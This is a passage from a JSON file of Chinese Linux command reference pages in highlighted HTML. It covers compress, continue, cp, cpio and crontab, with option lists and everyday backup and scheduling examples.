class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># cd /tmp</span>\n[root<span class=\"hljs-symbol\">@localhost</span> tmp]<span class=\"hljs-meta\"># cp /etc/man.config .</span>\n[root<span class=\"hljs-symbol\">@localhost</span> tmp]<span class=\"hljs-meta\"># compress man.config</span>\n[root<span class=\"hljs-symbol\">@localhost</span> tmp]<span class=\"hljs-meta\"># ls -l</span>\n</code></pre>\n<pre><code class=\"language-shell\">-rw-r--r--<span class=\"hljs-number\"> 1 </span>root root<span class=\"hljs-number\"> 2605 </span>Jul<span class=\"hljs-number\"> 27 </span>11:43 man.config.Z\n</code></pre>\n<p>将刚刚的压缩档解开</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> tmp]<span class=\"hljs-meta\"># compress -d man.config.Z</span>\n</code></pre>\n<p>将 man.config 压缩成另外一个文件来备份</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">[root@localhost tmp]</span># compress -c <span class=\"hljs-keyword\">man</span>.config &gt; <span class=\"hljs-keyword\">man</span>.config.back.Z\n<span class=\"hljs-comment\">[root@localhost tmp]</span># ll <span class=\"hljs-keyword\">man</span>.config*\n</code></pre>\n<pre><code class=\"language-shell\">-rw-r--r--<span class=\"hljs-number\"> 1 </span>root root<span class=\"hljs-number\"> 4506 </span>Jul<span class=\"hljs-number\"> 27 </span>11:43 man.config\n-rw-r--r--<span class=\"hljs-number\"> 1 </span>root root<span class=\"hljs-number\"> 2605 </span>Jul<span class=\"hljs-number\"> 27 </span>11:46 man.config.back.Z\n</code></pre>\n<p>这个<code>-c</code>的选项比较有趣！会将压缩过程的资料输出到屏幕上，而不是写入成为file.Z文件。所以，我们可以透过资料流重导向的方法将资料输出成为另一个档名。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "consoletype",
        "des": "输出已连接的终端类型",
        "body": "<h1 id=\"consoletype\">consoletype</h1>\n<p>输出已连接的终端类型</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>consoletype命令</strong> 用于打印已连接的终端类型到标准输出，并能够检查已连接的终端是当前终端还是虚拟终端。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">consoletype</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># consoletype</span>\npty\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "continue",
        "des": "结束本次循环，继续执行下一个for，while或until循环。",
        "body": "<h1 id=\"continue\">continue</h1>\n<p>结束本次循环，继续执行下一个for，while或until循环。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">continue</span> [n]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>结束本次循环，继续执行下一个for，while或until循环；可指定从第几层循环继续执行。</li>\n</ul>\n<h2 id=\"参数\">参数</h2>\n<p>n（可选）：大于等于1的整数，用于指定从第几层循环继续执行。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回状态为成功除非n小于1。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># continue的可选参数n缺省值为1。</span>\n<span class=\"hljs-attribute\">for</span>((i=<span class=\"hljs-number\">3</span>;i&gt;<span class=\"hljs-number\">0</span>;i--)); do\n  <span class=\"hljs-comment\"># 跳到内层for循环继续执行。</span>\n  <span class=\"hljs-attribute\">for</span>((j=<span class=\"hljs-number\">3</span>;j&gt;<span class=\"hljs-number\">0</span>;j--)); do\n    <span class=\"hljs-attribute\">if</span>((j==<span class=\"hljs-number\">2</span>)); then\n      <span class=\"hljs-comment\"># 换成continue 1时结果一样</span>\n      <span class=\"hljs-attribute\">continue</span>\n    <span class=\"hljs-attribute\">fi</span>\n  <span class=\"hljs-attribute\">printf</span> <span class=\"hljs-string\">\"%s %s\\n\"</span> <span class=\"hljs-variable\">${i}</span> <span class=\"hljs-variable\">${j}</span>\n  <span class=\"hljs-attribute\">done</span>\n<span class=\"hljs-attribute\">done</span>\n<span class=\"hljs-comment\"># 输出结果</span>\n<span class=\"hljs-attribute\">3</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-attribute\">3</span> <span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">2</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-attribute\">2</span> <span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">1</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-attribute\">1</span> <span class=\"hljs-number\">1</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 当n为2时：</span>\n<span class=\"hljs-comment\"># 跳到外层for循环继续执行。</span>\n<span class=\"hljs-attribute\">for</span>((i=<span class=\"hljs-number\">3</span>;i&gt;<span class=\"hljs-number\">0</span>;i--)); do\n  <span class=\"hljs-attribute\">for</span>((j=<span class=\"hljs-number\">3</span>;j&gt;<span class=\"hljs-number\">0</span>;j--)); do\n    <span class=\"hljs-attribute\">if</span>((j==<span class=\"hljs-number\">2</span>)); then\n      <span class=\"hljs-attribute\">continue</span> <span class=\"hljs-number\">2</span>\n    <span class=\"hljs-attribute\">fi</span>\n  <span class=\"hljs-attribute\">printf</span> <span class=\"hljs-string\">\"%s %s\\n\"</span> <span class=\"hljs-variable\">${i}</span> <span class=\"hljs-variable\">${j}</span>\n  <span class=\"hljs-attribute\">done</span>\n<span class=\"hljs-attribute\">done</span>\n<span class=\"hljs-comment\"># 输出结果</span>\n<span class=\"hljs-attribute\">3</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-attribute\">2</span> <span class=\"hljs-number\">3</span>\n<span class=\"hljs-attribute\">1</span> <span class=\"hljs-number\">3</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "convertquota",
        "des": "把老的配额文件转换为新的格式",
        "body": "<h1 id=\"convertquota\">convertquota</h1>\n<p>把老的配额文件转换为新的格式</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>convertquota命令</strong> 用于将老的磁盘额数据文件（“quota.user”和“quota.group”）转换为新格式的文件（“quota.user”和“quota.group”）。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">convertquota</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-u：仅转换用户磁盘配额数据文件；</span>\n<span class=\"hljs-deletion\">-g：仅转换组磁盘配额数据文件；</span>\n<span class=\"hljs-deletion\">-f：将老的磁盘配额文件转换为新的格式；</span>\n<span class=\"hljs-deletion\">-e：将新的文件格式从大字节序换为小字节序。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件系统：指定要转换磁盘配额数据文件格式的文件系统（硬盘分区）。</p>\n<h3 id=\"实例\">实例</h3>\n<p>使用convertquota指令转换指定文件系统<code>/data</code>的磁盘配额数据文件。在命令行中输入下面的命令：</p>\n<pre><code class=\"language-shell\">convertquota -u <span class=\"hljs-regexp\">/data     /</span><span class=\"hljs-regexp\">/转换文件系统\"/</span>data<span class=\"hljs-string\">\"上的用户磁盘配额文件</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "cp",
        "des": "将源文件或目录复制到目标文件或目录中",
        "body": "<h1 id=\"cp\">cp</h1>\n<p>将源文件或目录复制到目标文件或目录中</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cp命令</strong> 用来将一个或多个源文件或者目录复制到指定的目的文件或目录。它可以将单个源文件复制成一个指定文件名的具体的文件或一个已经存在的目录下。cp命令还支持同时复制多个文件，当一次复制多个文件时，目标文件参数必须是一个已经存在的目录，否则将出现错误。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">cp</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：此参数的效果和同时指定\"-dpR\"参数相同；</span>\n<span class=\"hljs-deletion\">-d：当复制符号连接时，把目标文件或目录也建立为符号连接，并指向与源文件或目录连接的原始文件或目录；</span>\n<span class=\"hljs-deletion\">-f：强行复制文件或目录，不论目标文件或目录是否已存在；</span>\n<span class=\"hljs-deletion\">-i：覆盖既有文件之前先询问用户；</span>\n<span class=\"hljs-deletion\">-l：对源文件建立硬连接，而非复制文件；</span>\n<span class=\"hljs-deletion\">-p：保留源文件或目录的属性；</span>\n<span class=\"hljs-deletion\">-R/r：递归处理，将指定目录下的所有文件与子目录一并处理；</span>\n<span class=\"hljs-deletion\">-s：对源文件建立符号连接，而非复制文件；</span>\n<span class=\"hljs-deletion\">-u：使用这项参数后只会在源文件的更改时间较目标文件更新时或是名称相互对应的目标文件并不存在时，才复制文件；</span>\n<span class=\"hljs-deletion\">-S：在备份文件时，用指定的后缀“SUFFIX”代替文件的默认后缀；</span>\n<span class=\"hljs-deletion\">-b：覆盖已存在的文件目标前将目标文件备份；</span>\n<span class=\"hljs-deletion\">-v：详细显示命令执行的操作。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  源文件：制定源文件列表。默认情况下，cp命令不能复制目录，如果要复制目录，则必须使用<code>-R</code>选项；</li>\n<li>  目标文件：指定目标文件。当“源文件”为多个文件时，要求“目标文件”为指定的目录。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>下面的第一行中是 cp 命令和具体的参数（-r 是“递归”， -u 是“更新”，-v 是“详细”）。接下来的三行显示被复制文件的信息，最后一行显示命令行提示符。这样，只拷贝新的文件到我的存储设备上，我就使用 cp 的“更新”和“详细”选项。</p>\n<p>通常来说，参数 <code>-r</code> 也可用更详细的风格 <code>--recursive</code>。但是以简短的方式，也可以这么连用 <code>-ruv</code>。</p>\n<pre><code class=\"language-shell\">cp -r -u -v <span class=\"hljs-regexp\">/usr/m</span>en<span class=\"hljs-regexp\">/tmp ~/m</span>en/tmp\n</code></pre>\n<p>版本备份 <code>--backup=numbered</code> 参数意思为“我要做个备份，而且是带编号的连续备份”。所以一个备份就是 1 号，第二个就是 2 号，等等。</p>\n<pre><code class=\"language-shell\">$ <span class=\"hljs-keyword\">cp</span> --force --backup=numbered test1.<span class=\"hljs-keyword\">py</span> test1.<span class=\"hljs-keyword\">py</span>\n$ <span class=\"hljs-keyword\">ls</span>\ntest1.<span class=\"hljs-keyword\">py</span> test1.<span class=\"hljs-keyword\">py</span>.~<span class=\"hljs-number\">1</span>~ test1.<span class=\"hljs-keyword\">py</span>.~<span class=\"hljs-number\">2</span>~\n</code></pre>\n<p>如果把一个文件复制到一个目标文件中，而目标文件已经存在，那么，该目标文件的内容将被破坏。此命令中所有参数既可以是绝对路径名，也可以是相对路径名。通常会用到点<code>.</code>或点点<code>..</code>的形式。例如，下面的命令将指定文件复制到当前目录下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">cp</span></span> ../mary/homework/<span class=\"hljs-keyword\">assign</span> .\n</code></pre>\n<p>所有目标文件指定的目录必须是己经存在的，cp命令不能创建目录。如果没有文件复制的权限，则系统会显示出错信息。</p>\n<p>将文件file复制到目录<code>/usr/men/tmp</code>下，并改名为file1</p>\n<pre><code class=\"language-shell\">cp <span class=\"hljs-keyword\">file</span> <span class=\"hljs-regexp\">/usr/m</span>en<span class=\"hljs-regexp\">/tmp/</span>file1\n</code></pre>\n<p>将目录<code>/usr/men</code>下的所有文件及其子目录复制到目录<code>/usr/zh</code>中</p>\n<pre><code class=\"language-shell\">cp -r <span class=\"hljs-regexp\">/usr/m</span>en <span class=\"hljs-regexp\">/usr/</span>zh\n</code></pre>\n<p>交互式地将目录<code>/usr/men</code>中的以m打头的所有.c文件复制到目录<code>/usr/zh</code>中</p>\n<pre><code class=\"language-shell\">cp -i <span class=\"hljs-regexp\">/usr/m</span>en m*.c <span class=\"hljs-regexp\">/usr/</span>zh\n</code></pre>\n<p>我们在Linux下使用cp命令复制文件时候，有时候会需要覆盖一些同名文件，覆盖文件的时候都会有提示：需要不停的按Y来确定执行覆盖。文件数量不多还好，但是要是几百个估计按Y都要吐血了，于是折腾来半天总结了一个方法：</p>\n<pre><code class=\"language-shell\">cp aaa<span class=\"hljs-regexp\">/* /</span>bbb\n<span class=\"hljs-comment\"># 复制目录aaa下所有到/bbb目录下，这时如果/bbb目录下有和aaa同名的文件，需要按Y来确认并且会略过aaa目录下的子目录。</span>\n\ncp -r aaa<span class=\"hljs-regexp\">/* /</span>bbb\n<span class=\"hljs-comment\"># 这次依然需要按Y来确认操作，但是没有忽略子目录。</span>\n\ncp -r -a aaa<span class=\"hljs-regexp\">/* /</span>bbb\n<span class=\"hljs-comment\"># 依然需要按Y来确认操作，并且把aaa目录以及子目录和文件属性也传递到了/bbb。</span>\n\n\\cp -r -a aaa<span class=\"hljs-regexp\">/* /</span>bbb\n<span class=\"hljs-comment\"># 成功，没有提示按Y、传递了目录属性、没有略过目录。</span>\n</code></pre>\n<p>递归强制复制目录到指定目录中覆盖已存在文件</p>\n<pre><code class=\"language-shell\">cp -rfb .<span class=\"hljs-regexp\">/* ../</span>backup\n<span class=\"hljs-comment\"># 将当前目录下所有文件，复制到当前目录的兄弟目录 backup 文件夹中</span>\n</code></pre>\n<p>拷贝目录下的隐藏文件如 <code>.babelrc</code></p>\n<pre><code class=\"language-shell\">cp -r aaa<span class=\"hljs-regexp\">/.* ./</span>bbb\n<span class=\"hljs-comment\"># 将 aaa 目录下的，所有`.`开头的文件，复制到 bbb 目录中。</span>\n\ncp -a aaa .<span class=\"hljs-regexp\">/bbb/</span> \n<span class=\"hljs-comment\"># 记住后面目录最好的'/' 带上 `-a` 参数</span>\n</code></pre>\n<p>复制到当前目录</p>\n<pre><code class=\"language-sh\"><span class=\"hljs-keyword\">cp</span> aaa.<span class=\"hljs-keyword\">conf</span> ./\n# 将 aaa.<span class=\"hljs-keyword\">conf</span> 复制到当前目录\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "cpio",
        "des": "用来建立、还原备份档的工具程序",
        "body": "<h1 id=\"cpio\">cpio</h1>\n<p>用来建立、还原备份档的工具程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cpio命令</strong> 主要是用来建立或者还原备份档的工具程序，cpio命令可以复制文件到归档包中，或者从归档包中复制文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">cpio</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-0或--null：接受新增列控制字符，通常配合find指令的“-print0”参数使用；</span>\n<span class=\"hljs-deletion\">-a或--rest-access-time：重新设置文件的存取时间；</span>\n<span class=\"hljs-deletion\">-A或--append：附加到已存在的备份文档中，且这个备份文档必须存放在磁盘上，而不能放置于磁带机里；</span>\n<span class=\"hljs-deletion\">-b或--awap：此参数的效果和同时指定“-ss”参数相同；</span>\n<span class=\"hljs-deletion\">-B：将输入/输出的区块大小改成5210Bytes；</span>\n<span class=\"hljs-deletion\">-c：使用旧ASCII备份格式；</span>\n<span class=\"hljs-deletion\">-C&lt;区块大小&gt;或--io-size=&lt;区块大小&gt;：设置输入/输出的区块大小，单位是Byte；</span>\n<span class=\"hljs-deletion\">-d或--make-directories：如有需要cpio会自行建立目录；</span>\n<span class=\"hljs-deletion\">-E&lt;范本文件&gt;或--pattern-file=&lt;范本文件&gt;：指定范本文件，其内含有一个或多个范本样式，让cpio解开符合范本条件的文件，格式为每列一个范本样式；</span>\n<span class=\"hljs-deletion\">-f或--nonmatching：让cpio解开所有不符合范本条件的文件；</span>\n<span class=\"hljs-deletion\">-F&lt;备份档&gt;或--file=&lt;备份档&gt;：指定备份档的名称，用来取代标准输入或输出，也能借此通过网络使用另一台主机的保存设备存取备份档；</span>\n<span class=\"hljs-deletion\">-H&lt;备份格式&gt;：指定备份时欲使用的文件格式；</span>\n<span class=\"hljs-deletion\">-i或--extract：执行copy-in模式，还原备份档；</span>\n<span class=\"hljs-deletion\">-l&lt;备份档&gt;：指定备份档的名称，用来取代标准输入，也能借此通过网络使用另一台主机的保存设备读取备份档；</span>\n<span class=\"hljs-deletion\">-k：此参数将忽略不予处理，仅负责解决cpio不同版本间的兼容性问题；</span>\n<span class=\"hljs-deletion\">-l或--link：以硬连接的方式取代复制文件，可在copy-pass模式下运用；</span>\n<span class=\"hljs-deletion\">-L或--dereference：不建立符号连接，直接复制该连接所指向的原始文件；</span>\n<span class=\"hljs-deletion\">-m或preserve-modification-time：不去更改文件的更改时间；</span>\n<span class=\"hljs-deletion\">-M&lt;回传信息&gt;或--message=&lt;回传信息&gt;：设置更换保存媒体的信息；</span>\n<span class=\"hljs-deletion\">-n或--numeric-uid-gid：使用“-tv”参数列出备份档的内容时，若再加上参数“-n”，则会以用户识别和群组识别码替代拥有者和群组名称列出文件清单；</span>\n<span class=\"hljs-deletion\">-o或--create：执行copy-out模式，建立备份档；</span>\n<span class=\"hljs-deletion\">-O&lt;备份档&gt;：指定备份档的名称，用来取代标准输出，也能借此通过网络使用另一台主机的保存设备存放备份档；</span>\n<span class=\"hljs-deletion\">-p或--pass-through：执行copy-pass模式，略过备份步骤，直接将文件复制到目的目录；</span>\n<span class=\"hljs-deletion\">-r或--rename：当有文件名称需要更改时，采用互动模式；</span>\n<span class=\"hljs-deletion\">-R&lt;拥有者&gt;&lt;:/.&gt;&lt;所属群组&gt;或----owner&lt;拥有者&gt;&lt;:/.&gt;&lt;所属群组&gt;   在copy-in模式还原备份档，或copy-pass模式复制文件时，可指定这些备份，复制的文件的拥有者与所属群组；</span>\n<span class=\"hljs-deletion\">-s或--swap-bytes：交换每队字节的内容；</span>\n<span class=\"hljs-deletion\">-S或--swap-halfwords：交换每半个字节的内容；</span>\n<span class=\"hljs-deletion\">-t或--list：将输入的内容呈现出来；</span>\n<span class=\"hljs-deletion\">-u或--unconditional：置换所有文件，不论日期时间的新旧与否，皆不予询问而直接覆盖；</span>\n<span class=\"hljs-deletion\">-v或--verbose：详细显示指令的执行过程；</span>\n<span class=\"hljs-deletion\">-V或--dot：执行指令时。在每个文件的执行程序前面加上“.”号；</span>\n<span class=\"hljs-deletion\">--block-size=&lt;区块大小&gt;：设置输入/输出的区块大小，假如设置数值为5，则区块大小为2500，若设置成10，则区块大小为5120，以此类推；</span>\n<span class=\"hljs-deletion\">--force-local：强制将备份档存放在本地主机；</span>\n<span class=\"hljs-deletion\">--help：在线帮助；</span>\n<span class=\"hljs-deletion\">--no-absolute-filenames：使用相对路径建立文件名称；</span>\n<span class=\"hljs-deletion\">--no-preserve-owner：不保留文件的拥有者，谁解开了备份档，那些文件就归谁所有；</span>\n<span class=\"hljs-deletion\">-only-verify-crc：当备份档采用CRC备份格式时，可使用这项参数检查备份档内的每个文件是否正确无误；</span>\n<span class=\"hljs-deletion\">--quiet：不显示复制了多少区块；</span>\n<span class=\"hljs-deletion\">--sparse：倘若一个文件内含有大量的连续0字节，则将此文件存在稀疏文件；</span>\n<span class=\"hljs-deletion\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p><strong>将<code>/etc</code>下的所有普通文件都备份到<code>/opt/etc.cpio</code>，使用以下命令：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">find</span> <span class=\"hljs-regexp\">/etc –type f | cpio –ocvB &gt;/</span>opt/etc.cpio\n</code></pre>\n<p><strong>将系统上所有资料备份到磁带机内，使用以下命令：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> / -<span class=\"hljs-built_in\">print</span> | cpio -covB &gt; /dev/st0\n</code></pre>\n<p>这里的<code>/dev/st0</code>是磁带的设备名，代表SCSI磁带机。</p>\n<p><strong>查看上例磁带机上备份的文件，使用以下命令：</strong> </p>\n<pre><code class=\"language-shell\">cpio  -icdvt &lt; <span class=\"hljs-regexp\">/dev/</span>st0 &gt; <span class=\"hljs-regexp\">/tmp/</span>st_content\n</code></pre>\n<p>有时可能因为备份的文件过多，一个屏幕无法显示完毕，此时我们利用下面命令，让磁带机的文件信息输出到文件。</p>\n<p><strong>将示例1中的备份包还原到相应的位置，如果有相同文件进行覆盖，使用以下命令：</strong> </p>\n<pre><code class=\"language-shell\">cpio –icduv &lt; <span class=\"hljs-regexp\">/opt/</span>etc.cpio\n</code></pre>\n<p>注意，cpio恢复的路径，如果cpio在打包备份的时候用的是绝对路径，那么在恢复的时候会自动恢复到这些绝对路径下，本例就会将备份文件全部还原到/etc路径下对应的目录中。同理，如果在打包备份用的是相对路径，还原时也将恢复到相对路径下。</p>\n<p>通过上面的示例，可以看出，cpio无法直接读取文件，它需要每个文件或者目录的完整路径名才能识别读取，而find命令的输出刚好做到了这点，因此，cpio命令一般和find命令配合使用。其实，上面的示例我们已经看到了它们的组合用法。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "crontab",
        "des": "提交和管理用户的需要周期性执行的任务",
        "body": "<h1 id=\"crontab\">crontab</h1>\n<p>提交和管理用户的需要周期性执行的任务</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>crontab命令</strong> 被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">crontab</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-e：编辑该用户的计时器设置；</span>\n<span class=\"hljs-deletion\">-l：列出该用户的计时器设置；</span>\n<span class=\"hljs-deletion\">-r：删除该用户的计时器设置；</span>\n<span class=\"hljs-deletion\">-u&lt;用户名称&gt;：指定要设定计时器的用户名称。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>crontab文件：指定包含待执行任务的crontab文件。</p>\n<h3 id=\"知识扩展\">知识扩展</h3>\n<p>Linux下的任务调度分为两类： <strong>系统任务调度</strong> 和 <strong>用户任务调度</strong> 。</p>\n<p> <strong>系统任务调度：</strong> 系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在<code>/etc</code>目录下有一个crontab文件，这个就是系统任务调度的配置文件。</p>\n<p><code>/etc/crontab</code>文件包括下面几行：</p>\n<pre><code class=\"language-shell\">SHELL=<span class=\"hljs-regexp\">/bin/</span>bash\nPATH=<span class=\"hljs-regexp\">/sbin:/</span>bin:<span class=\"hljs-regexp\">/usr/</span>sbin:<span class=\"hljs-regexp\">/usr/</span>bin\nMAILTO=<span class=\"hljs-string\">\"\"</span>HOME=/\n\n<span class=\"hljs-comment\"># run-parts</span>\n<span class=\"hljs-number\">51</span> * * * * root run-parts <span class=\"hljs-regexp\">/etc/</span>cron.hourly\n<span class=\"hljs-number\">24</span> <span class=\"hljs-number\">7</span> * * * root run-parts <span class=\"hljs-regexp\">/etc/</span>cron.daily\n<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">4</span> * * <span class=\"hljs-number\">0</span> root run-parts <span class=\"hljs-regexp\">/etc/</span>cron.weekly\n<span class=\"hljs-number\">42</span> <span class=\"hljs-number\">4</span> <span class=\"hljs-number\">1</span> * * root run-parts <span class=\"hljs-regexp\">/etc/</span>cron.monthly\n</code></pre>\n<p>前四行是用来配置crond任务运行的环境变量，第一行SHELL变量指定了系统要使用哪个shell，这里是bash，第二行PATH变量指定了系统执行命令的路径，第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。</p>\n<p> <strong>用户任务调度：</strong> 用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用&nbsp;crontab&nbsp;工具来定制自己的计划任务。所有用户定义的crontab文件都被保存在<code>/var/spool/cron</code>目录中。其文件名与用户名一致，使用者权限文件如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/etc/</span>cron.deny     该文件中所列用户不允许使用crontab命令\n<span class=\"hljs-regexp\">/etc/</span>cron.allow    该文件中所列用户允许使用crontab命令\n<span class=\"hljs-regexp\">/var/</span>spool<span class=\"hljs-regexp\">/cron/</span>   所有用户crontab文件存放的目录,以用户名命名\n</code></pre>\n<p>crontab文件的含义：用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">minute</span>   <span class=\"hljs-built_in\">hour</span>   <span class=\"hljs-built_in\">day</span>   <span class=\"hljs-built_in\">month</span>   week   command     顺序：分 时 日 月 周\n</code></pre>\n<p>其中：</p>\n<ul>\n<li>  minute：&nbsp;表示分钟，可以是从0到59之间的任何整数。</li>\n<li>  hour：表示小时，可以是从0到23之间的任何整数。</li>\n<li>  day：表示日期，可以是从1到31之间的任何整数。</li>\n<li>  month：表示月份，可以是从1到12之间的任何整数。</li>\n<li>  week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。</li>\n<li>  command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。</li>\n</ul>\n<p>在以上各个字段中，还可以使用以下特殊字符：</p>\n<ul>\n<li>  星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。</li>\n<li>  逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”</li>\n<li>  中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”</li>\n<li>  正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。</li>\n</ul>\n<p><strong>crond服务</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/sbin/</span>service crond start    <span class=\"hljs-comment\"># 启动服务</span>\n<span class=\"hljs-regexp\">/sbin/</span>service crond stop     <span class=\"hljs-comment\"># 关闭服务</span>\n<span class=\"hljs-regexp\">/sbin/</span>service crond restart  <span class=\"hljs-comment\"># 重启服务</span>\n<span class=\"hljs-regexp\">/sbin/</span>service crond reload   <span class=\"hljs-comment\"># 重新载入配置</span>\n</code></pre>\n<p>查看crontab服务状态：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">service crond status</span>\n</code></pre>\n<p>手动启动crontab服务：</p>\n<pre><code class=\"language-shell\">service crond <span class=\"hljs-literal\">start</span>\n</code></pre>\n<p>查看crontab服务是否已设置为开机启动，执行命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ntsysv</span>\n</code></pre>\n<p>加入开机自动启动：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">chkconfig</span> –level <span class=\"hljs-number\">35</span> crond <span class=\"hljs-literal\">on</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>每1分钟执行一次command</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-bullet\">*</span> <span class=\"hljs-emphasis\">* *</span> <span class=\"hljs-emphasis\">* *</span> command\n</code></pre>\n<p>每小时的第3和第15分钟执行</p>\n<pre><code class=\"language-shell\">3,15 <span class=\"hljs-emphasis\">* *</span> <span class=\"hljs-emphasis\">* *</span> command\n</code></pre>\n<p>在上午8点到11点的第3和第15分钟执行</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">3</span>,<span class=\"hljs-number\">15</span> <span class=\"hljs-number\">8</span>-<span class=\"hljs-number\">11</span> * * * command\n</code></pre>\n<p>每隔两天的上午8点到11点的第3和第15分钟执行</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">3</span>,<span class=\"hljs-number\">15</span> <span class=\"hljs-number\">8</span>-<span class=\"hljs-number\">11</span> */<span class=\"hljs-number\">2</span> * * command\n</code></pre>\n<p>每个星期一的上午8点到11点的第3和第15分钟执行</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">3</span>,<span class=\"hljs-number\">15</span> <span class=\"hljs-number\">8</span>-<span class=\"hljs-number\">11</span> * * <span class=\"hljs-number\">1</span> command\n</code></pre>\n<p>每晚的21:30重启smb&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">30 </span><span class=\"hljs-number\">21</span> * * * /etc/init.d/smb restart\n</code></pre>\n<p>每月1、10、22日的4&nbsp;:&nbsp;45重启smb&nbsp;</p>\n<pre><code class=\"language-shell\"><span 